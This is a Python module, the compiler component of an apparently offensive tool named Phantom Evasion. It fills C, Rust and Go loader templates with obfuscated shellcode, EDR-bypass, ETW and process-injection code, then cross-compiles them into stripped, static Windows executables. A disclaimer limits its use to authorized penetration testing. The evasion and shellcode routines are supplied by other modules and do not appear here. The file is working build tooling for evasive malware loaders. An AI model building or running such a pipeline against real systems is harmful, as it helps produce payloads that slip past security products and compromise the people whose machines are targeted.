"""
Phantom Evasion - Compiler

LEGAL DISCLAIMER:
For authorized penetration testing and security research ONLY.
Users must have explicit written permission from the target system owner.
"""

import os
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, Any, Optional


class Compiler:
    """Compile obfuscated loader templates using the appropriate toolchain."""

    # Compilation flags for C (MinGW cross-compiler)
    _C_FLAGS = [
        "-mwindows",
        "-O2",
        "-s",
        "-static",
        "-lntdll",
        "-lbcrypt",
        "-ladvapi32",
        "-luser32",
        "-lkernel32",
        "-lshlwapi",
    ]

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def compile_c(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        """Inject code into a C template and compile with MinGW cross-compiler.

        Args:
            template:       Path to the ``loader_c.c`` template file.
            output_path:    Destination path for the compiled binary.
            obfuscated_code: Dict returned by :meth:`Obfuscator.apply_all_layers`.

        Returns:
            ``True`` if compilation succeeded, ``False`` if the compiler
            binary was not found on PATH.

        Raises:
            RuntimeError: If the compiler exits with a non-zero status.
        """
        compiler_bin = self._find_c_compiler()
        if compiler_bin is None:
            return False

        source = self._fill_c_template(template, obfuscated_code)

        with tempfile.NamedTemporaryFile(suffix=".c", delete=False, mode="w", encoding="utf-8") as tmp:
            tmp.write(source)
            tmp_path = tmp.name

        try:
            cmd = [compiler_bin, tmp_path, "-o", output_path] + self._C_FLAGS
            self._run(cmd)
        finally:
            os.unlink(tmp_path)

        return True

    def compile_rust(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        """Inject code into a Rust template and compile with rustc.

        Args:
            template:       Path to the ``loader_rust.rs`` template file.
            output_path:    Destination path for the compiled binary.
            obfuscated_code: Dict returned by :meth:`Obfuscator.apply_all_layers`.

        Returns:
            ``True`` if compilation succeeded, ``False`` if ``rustc`` was not found.

        Raises:
            RuntimeError: If the compiler exits with a non-zero status.
        """
        compiler_bin = self._find_tool("rustc")
        if compiler_bin is None:
            return False

        source = self._fill_rust_template(template, obfuscated_code)

        with tempfile.NamedTemporaryFile(suffix=".rs", delete=False, mode="w", encoding="utf-8") as tmp:
            tmp.write(source)
            tmp_path = tmp.name

        try:
            cmd = [
                compiler_bin,
                tmp_path,
                "-o", output_path,
                "--target", "x86_64-pc-windows-gnu",
                "-C", "opt-level=2",
                "-C", "strip=symbols",
            ]
            self._run(cmd)
        finally:
            os.unlink(tmp_path)

        return True

    def compile_go(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        """Inject code into a Go template and compile with the Go toolchain.

        Args:
            template:       Path to the ``loader_go.go`` template file.
            output_path:    Destination path for the compiled binary.
            obfuscated_code: Dict returned by :meth:`Obfuscator.apply_all_layers`.

        Returns:
            ``True`` if compilation succeeded, ``False`` if ``go`` was not found.

        Raises:
            RuntimeError: If the compiler exits with a non-zero status.
        """
        compiler_bin = self._find_tool("go")
        if compiler_bin is None:
            return False

        source = self._fill_go_template(template, obfuscated_code)

        with tempfile.TemporaryDirectory() as tmp_dir:
            src_file = os.path.join(tmp_dir, "main.go")
            with open(src_file, "w", encoding="utf-8") as f:
                f.write(source)

            env = os.environ.copy()
            env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})
            cmd = [compiler_bin, "build", "-ldflags", "-s -w", "-o", output_path, src_file]
            self._run(cmd, env=env)

        return True

    # ------------------------------------------------------------------
    # Template filling helpers
    # ------------------------------------------------------------------

    def _fill_c_template(self, template_path: str, code: Dict[str, Any]) -> str:
        """Read the C template and substitute all PLACEHOLDER comments."""
        source = self._read_template(template_path)
        substitutions = {
            "/* PLACEHOLDER: decryption_key */": "",
            "/* PLACEHOLDER: encrypted_shellcode */": "",
            "/* PLACEHOLDER: decryption_routine */": code.get("encryption_code", ""),
            "/* PLACEHOLDER: evasion_techniques */": "\n".join(filter(None, [
                code.get("edr_code", ""),
                code.get("etw_code", ""),
                code.get("behavioral_code", ""),
            ])),
            "/* PLACEHOLDER: injection_method */": code.get("injection_code", ""),
            "/* PLACEHOLDER: main_logic */": code.get("main_logic", ""),
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)
        return source

    def _fill_rust_template(self, template_path: str, code: Dict[str, Any]) -> str:
        """Read the Rust template and substitute all PLACEHOLDER comments."""
        source = self._read_template(template_path)
        substitutions = {
            "// PLACEHOLDER: shellcode": f"// Shellcode embedded by Phantom Evasion\n// {code.get('description', '')}",
            "// PLACEHOLDER: evasion": f"// EDR bypass: {code.get('edr_code', '')[:80]}",
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)
        return source

    def _fill_go_template(self, template_path: str, code: Dict[str, Any]) -> str:
        """Read the Go template and substitute all PLACEHOLDER comments."""
        source = self._read_template(template_path)
        substitutions = {
            "// PLACEHOLDER: shellcode": f"// Shellcode embedded by Phantom Evasion\n// {code.get('description', '')}",
            "// PLACEHOLDER: evasion": f"// EDR bypass: {code.get('edr_code', '')[:80]}",
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)
        return source

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    @staticmethod
    def _read_template(template_path: str) -> str:
        """Return the contents of *template_path*, or a minimal stub on error."""
        try:
            with open(template_path, encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return "/* Template file not found */\n"

    @staticmethod
    def _find_tool(name: str) -> Optional[str]:
        """Return the full path to *name* if it exists on PATH, else None."""
        return shutil.which(name)

    @staticmethod
    def _find_c_compiler() -> Optional[str]:
        """Try multiple C compiler names, returning the first one found on PATH."""
        candidates = [
            "x86_64-w64-mingw32-gcc",  # Linux cross-compiler
            "gcc",                      # Windows MinGW / MSYS2
            "cc",                       # Generic Unix
        ]
        for name in candidates:
            path = shutil.which(name)
            if path is not None:
                return path
        return None

    @staticmethod
    def _run(cmd: list, env: Optional[dict] = None) -> None:
        """Run *cmd* and raise RuntimeError on failure."""
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"Compilation failed (exit {result.returncode}):\n"
                f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
            )
